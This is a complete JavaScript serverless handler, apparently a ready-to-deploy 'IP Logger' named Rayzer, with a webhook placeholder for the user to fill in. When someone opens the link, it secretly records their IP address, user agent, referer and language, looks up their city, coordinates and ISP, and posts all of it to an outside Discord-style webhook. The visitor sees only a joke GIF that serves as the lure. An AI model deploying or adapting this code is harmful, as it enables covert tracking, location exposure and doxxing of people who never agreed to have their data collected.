// /api/rayzer.js

export default async function handler(req, res) {
  const webhookUrl = "PUT YOUR WEBHOOK HERE";
  const ip = (req.headers["x-forwarded-for"] || req.connection.remoteAddress || "").split(",")[0].trim();
  const userAgent = req.headers["user-agent"] || "Yok";
  const referer = req.headers["referer"] || "Yok";
  const lang = req.headers["accept-language"] || "Yok";

  let geo = {};
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,query`);
    geo = await r.json();
  } catch {
    geo = { country: "?", city: "?", regionName: "?", lat: "?", lon: "?", isp: "?" };
  }

  const embed = {
    username: "IP Logger",
    embeds: [
      {
        title: "New Visitor 🔍",
        color: 0x2f3136,
        fields: [
          { name: "IP", value: `\`${ip}\``, inline: true },
          { name: "Location", value: `${geo.city}, ${geo.regionName}, ${geo.country}`, inline: true },
          { name: "Cords", value: `${geo.lat}, ${geo.lon}`, inline: true },
          { name: "ISP", value: geo.isp || "Bilinmiyor", inline: false },
          { name: "User-Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
          { name: "Referer", value: referer, inline: false },
          { name: "Language", value: lang, inline: true }
        ],
        footer: { text: "Rayzer Logger" },
        timestamp: new Date().toISOString()
      }
    ]
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(embed)
  }).catch(() => {});

  res.setHeader("Content-Type", "text/html");
  res.status(200).send(`
    <!DOCTYPE html>
    <html>
      <head><title>Rayzer</title><meta name="viewport" content="width=device-width, initial-scale=1.0"/></head>
      <body style="margin:0;background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
        <img src="https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif" style="max-width:100%;height:auto;" />
      </body>
    </html>
  `);
}
